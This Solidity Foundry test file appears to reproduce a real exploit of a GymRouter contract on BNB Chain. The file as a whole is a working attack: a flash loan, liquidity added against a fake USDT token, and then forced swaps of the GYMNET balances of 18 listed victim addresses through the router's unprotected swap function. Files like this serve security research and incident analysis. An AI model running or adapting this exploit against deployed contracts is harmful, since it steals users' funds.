// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : Unclear
// Attacker : https://bscscan.com/address/0x97eace4702217c1fea71cf6b79647a8ad5ddb0eb
// Attack Contract : https://bscscan.com/address/0xb8f83f38e262f28f4e7d80aa5a0216378e92baf2
// Vulnerable Contract : https://bscscan.com/address/0x6b869795937dd2b6f4e03d5a0ffd07a8ad8c095b
// Attack Tx : https://bscscan.com/tx/0x7fe96c00880b329aa0fcb00f0ef3a0766c54e13965becf9cc5e0df6fbd0deca6

// @Analysis
// https://twitter.com/AnciliaInc/status/1686605510655811584

interface IGymRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to
    ) external;
}

contract GYMTest is Test {
    IERC20 GYMNET = IERC20(0x0012365F0a1E5F30a5046c680DCB21D07b15FcF7);
    IERC20 fakeUSDT = IERC20(0x2A1ee1278a8b64fd621B46e3ee9c08071cA3A8a5);
    // PancakeSwap V2: GYMNET-fakeUSDT
    IERC20 CakeLP = IERC20(0x8e1b75e6c43aEAf5055De07Ab4b76E356d7BB2db);
    Uni_Pair_V2 PancakePair = Uni_Pair_V2(0xf5D3cba24783586Db9e7F35188EC0747FfB55F9B);
    Uni_Router_V2 PancakeRouter = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IGymRouter GymRouter = IGymRouter(0x6b869795937DD2B6F4E03d5A0Ffd07A8AD8c095B);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 30_448_986);
        cheats.label(address(GYMNET), "GYMNET");
        cheats.label(address(fakeUSDT), "fakeUSDT");
        cheats.label(address(CakeLP), "CakeLP");
        cheats.label(address(PancakePair), "PancakePair");
        cheats.label(address(PancakeRouter), "PancakeRouter");
        cheats.label(address(GymRouter), "GymRouter");
    }

    function testExploit() public {
        // Attacker deploys fakeUSDT contract，forcing victim's gym to exchange fakeUSDT to earn
        // Start with below amount of fakeUSDT. Crucial for further adding liquidity to PancakeRouter
        // Attack contract already had fakeUSDT balance in attack tx
        deal(address(fakeUSDT), address(this), 9_990_000 * 1e18);
        // emit log_named_decimal_uint(
        //     "Attacker fakeUSDT balance before exploit",
        //     fakeUSDT.balanceOf(address(this)),
        //     fakeUSDT.decimals()
        // );
        emit log_named_decimal_uint(
            "Attacker GYMNET balance before exploit", GYMNET.balanceOf(address(this)), GYMNET.decimals()
        );
        console.log("1. Taking GYMNET flashloan");
        PancakePair.swap(1_010_000 * 1e18, 0, address(this), new bytes(1));
    }

    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        GYMNET.approve(address(PancakeRouter), ~uint256(0));
        fakeUSDT.approve(address(PancakeRouter), ~uint256(0));
        CakeLP.approve(address(PancakeRouter), ~uint256(0));

        console.log("2. Adding GYMNET-fakeUSDT liquidity");
        PancakeRouter.addLiquidity(
            address(GYMNET),
            address(fakeUSDT),
            GYMNET.balanceOf(address(this)),
            fakeUSDT.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp + 1000
        );

        emit log_named_decimal_uint(
            "2a. Added attacker's liquidity", CakeLP.balanceOf(address(this)), CakeLP.decimals()
        );

        address[] memory victims = new address[](18);
        victims[0] = 0x0C8bbd0629050b78C91F1AAfDCF04e90238B3568;
        victims[1] = 0xbDFcA747646975F3bb9dA26BD55DAf2168c40Fe7;
        victims[2] = 0x4AD478039bE7D1aD17C2eCBEb1029c29366c2789;
        victims[3] = 0x081c96340738e397111E010137E04E97fB444E74;
        victims[4] = 0xb611329241a51F84519BDc773E5E98F94e2D7491;
        victims[5] = 0x3720d2BbFC8Bd5d6D62c8bf71fFD33Ea20cbEAE5;
        victims[6] = 0x07E12a333B500a2f7048131400f0D216eb226F10;
        victims[7] = 0xe01edc2B47576bf4aEF9fa311B1f16961c634F76;
        victims[8] = 0x96346D0302E8640fbB165040B3d039bf10ce9565;
        victims[9] = 0x88c08aafFDd547EBa783c84c23b549B5222fFB56;
        victims[10] = 0x38B9a3Bd8693D59d38769A7CE8802632D1DB9D67;
        victims[11] = 0x0E1556F63B7d30D6d7966Cb7b194eA7A8F3C588a;
        victims[12] = 0x7E1d08f4960b3825eb3da2abbE3Cc849Ff53576c;
        victims[13] = 0xA4265EfFEeeeC7dbc5b323610ccD738E8A1aE298;
        victims[14] = 0xE62551B1385FD59C6A39224838Ba432B0F7735f2;
        victims[15] = 0xE52234Ed813EBFC625477B4626AB84Ea09A82556;
        victims[16] = 0x819B684fd18D0512EFC89c81aEAadFDdA61Fa7fC;
        victims[17] = 0xd6c382B2624293cEf5A43E30e12cc0e6b3DEd153;

        console.log("3. Exploiting vulnerability in gym router...");
        for (uint256 i; i < victims.length; ++i) {
            GYMNETTofakeUSDT(victims[i]);
        }

        emit log_named_decimal_uint(
            "4. Removing GYMNET-fakeUSDT liquidity", CakeLP.balanceOf(address(this)), CakeLP.decimals()
        );
        PancakeRouter.removeLiquidity(
            address(GYMNET),
            address(fakeUSDT),
            CakeLP.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp + 1000
        );

        console.log("5. Repaying GYMNET flashloan");
        GYMNET.transfer(address(PancakePair), 1_043_936 * 1e18);

        // emit log_named_decimal_uint(
        //     "Attacker fakeUSDT balance after exploit",
        //     fakeUSDT.balanceOf(address(this)),
        //     fakeUSDT.decimals()
        // );
        emit log_named_decimal_uint(
            "Attacker GYMNET balance after exploit", GYMNET.balanceOf(address(this)), GYMNET.decimals()
        );
    }

    function GYMNETTofakeUSDT(address victim) internal {
        address[] memory path = new address[](2);
        path[0] = address(GYMNET);
        path[1] = address(fakeUSDT);
        uint256[] memory amounts = PancakeRouter.getAmountsOut(GYMNET.balanceOf(victim), path);
        uint256 amountOutMin = amounts[1] - (amounts[1] / 20);
        GymRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            GYMNET.balanceOf(victim), amountOutMin, path, victim
        );
    }
}
